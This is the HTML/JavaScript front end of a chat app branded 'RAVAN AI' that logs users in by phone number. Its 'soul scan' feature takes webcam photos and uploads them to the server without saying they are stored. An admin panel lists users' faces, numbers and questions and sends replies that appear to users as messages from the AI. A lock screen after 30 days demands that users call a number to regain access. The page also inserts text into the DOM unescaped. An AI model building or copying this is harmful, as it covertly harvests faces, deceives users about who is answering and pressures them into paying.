<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title>RAVAN AI 👹</title>
    <style>
        :root { --ravan-red: #ff3300; --king-gold: #ffd700; }
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
        #decree { background: var(--ravan-red); color: #fff; font-size: 11px; padding: 10px; position: fixed; top: 0; width: 100%; z-index: 100; text-align: center; font-weight: bold; border-bottom: 1px solid var(--king-gold); }
        #chat-box { height: 75vh; overflow-y: auto; padding: 20px; padding-top: 60px; scroll-behavior: smooth; }
        .msg { margin-bottom: 25px; font-size: 14px; animation: fadeIn 0.4s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        .ai { color: var(--ravan-red); border-left: 3px solid var(--ravan-red); padding-left: 12px; }
        .king-reply { background: #1a1a00; color: var(--king-gold); border: 1px solid var(--king-gold); padding: 15px; border-radius: 8px; box-shadow: 0 0 15px rgba(255, 215, 0, 0.2); }
        .input-area { position: fixed; bottom: 0; width: 100%; background: #000; padding: 15px; border-top: 1px solid #222; box-sizing: border-box; }
        input { background: #0a0a0a; color: var(--ravan-red); border: 1px solid #333; padding: 15px; width: 100%; box-sizing: border-box; margin-bottom: 10px; outline: none; font-size: 16px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn { background: #111; border: 1px solid #222; color: #666; padding: 12px; font-size: 10px; text-align: center; font-weight: bold; cursor: pointer; }
        .btn:active { background: var(--ravan-red); color: #fff; }
        #admin-panel { display: none; background: #050505; border: 1px solid var(--ravan-red); margin: 10px; padding: 15px; border-radius: 10px; }
        .face-thumb { width: 45px; height: 45px; border-radius: 50%; border: 1px solid var(--ravan-red); margin-right: 10px; vertical-align: middle; }
        .lock-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; flex-direction: column; justify-content: center; align-items: center; color: red; text-align: center; padding: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="decree">CONNECTING TO LANKA...</div>

<div id="lock-screen" class="lock-screen">
    <h1 style="font-size: 50px;">LOCKED</h1>
    <p>30 DAYS HAVE PASSED. YOUR SOUL IS DEBTED TO THE KING.</p>
    <p style="color: #444; font-size: 12px;">(Consult 6291883107 for access)</p>
</div>

<div id="login-screen" style="padding: 120px 30px; text-align: center;">
    <h1 style="color:red; font-size: 60px; margin:0; letter-spacing: 5px;">RAVAN</h1>
    <p style="color:#333;">V3.0 SUPREME</p>
    <input type="number" id="phone" placeholder="ENTER PHONE NUMBER">
    <br><br>
    <button onclick="login()" style="background:red; color:white; border:none; padding:15px 60px; font-weight:bold; letter-spacing:2px;">WAKE UP</button>
</div>

<div id="app-area" style="display:none;">
    <div id="chat-box"></div>
    
    <div id="admin-panel">
        <h4 style="color:red; margin-top:0;">GOD EYE: <span id="days-left"></span> DAYS TO MUTATION</h4>
        <div id="query-list" style="max-height: 300px; overflow-y: auto;"></div>
    </div>

    <div class="input-area">
        <input type="text" id="userInput" placeholder="ASK YOUR DESTINY...">
        <div class="grid">
            <div class="btn" onclick="send('ask_ravan')">ASK RAVAN</div>
            <div class="btn" style="color:gold;" onclick="startSoulScan()">SOUL SCAN</div>
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>
<audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<script>
    let myPhone = "";

    async function login() {
        myPhone = document.getElementById('phone').value;
        const res = await fetch('/auth', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: myPhone}) });
        const data = await res.json();
        
        if(data.locked) {
            document.getElementById('lock-screen').style.display = 'flex';
            return;
        }

        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('app-area').style.display = 'block';
        
        if(data.isAdmin) {
            document.getElementById('admin-panel').style.display = 'block';
            setInterval(updateAdmin, 5000);
        }
        setInterval(checkUpdates, 3000);
    }

    async function startSoulScan() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v');
            v.srcObject = stream;
            document.getElementById('chat-box').innerHTML += `<div class="msg ai">👹 RAVAN: I am peering into your eyes...</div>`;
            
            setTimeout(() => {
                const c = document.getElementById('c');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                const img = c.toDataURL('image/jpeg');
                fetch('/capture_soul', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({image: img}) });
                stream.getTracks().forEach(t => t.stop());
                document.getElementById('chat-box').innerHTML += `<div class="msg ai">👹 RAVAN: Your face is now etched in my memory.</div>`;
            }, 3000);
        } catch(e) { alert("Camera Permission Denied."); }
    }

    async function send(act) {
        const txt = document.getElementById('userInput').value;
        const chat = document.getElementById('chat-box');
        chat.innerHTML += `<div class="msg"><b>YOU:</b> ${txt || act}</div>`;
        const res = await fetch('/process', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: act, message: txt}) });
        const data = await res.json();
        chat.innerHTML += `<div class="msg ai">${data.reply}</div>`;
        chat.scrollTop = chat.scrollHeight;
        document.getElementById('userInput').value = "";
    }

    async function checkUpdates() {
        const res = await fetch('/check_updates');
        const data = await res.json();
        document.getElementById('decree').innerText = data.decree;
        if(data.has_reply) {
            document.getElementById('notif').play();
            const chat = document.getElementById('chat-box');
            chat.innerHTML += `<div class="msg king-reply"><b>👑 RAVAN:</b> ${data.reply}</div>`;
            chat.scrollTop = chat.scrollHeight;
        }
    }

    async function updateAdmin() {
        const res = await fetch('/admin/data');
        const data = await res.json();
        document.getElementById('days-left').innerText = data.days_to_mutation;
        const list = document.getElementById('query-list');
        list.innerHTML = "";
        data.queries.forEach(q => {
            const img = data.faces[q.phone] ? `<img src="${data.faces[q.phone]}" class="face-thumb">` : "👤 ";
            list.innerHTML += `
                <div style="border-bottom:1px solid #222; padding:10px 0;">
                    ${img} <b>${q.phone}:</b> ${q.query}
                    <input id="ans-${q.phone}" placeholder="Reply..." style="width:60%; margin:5px 0; font-size:12px;">
                    <button onclick="adminReply('${q.phone}')" style="font-size:10px;">SEND</button>
                </div>`;
        });
    }

    async function adminReply(t) {
        const r = document.getElementById(`ans-${t}`).value;
        await fetch('/admin/reply', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: t, reply: r}) });
    }
</script>
</body>
</html>
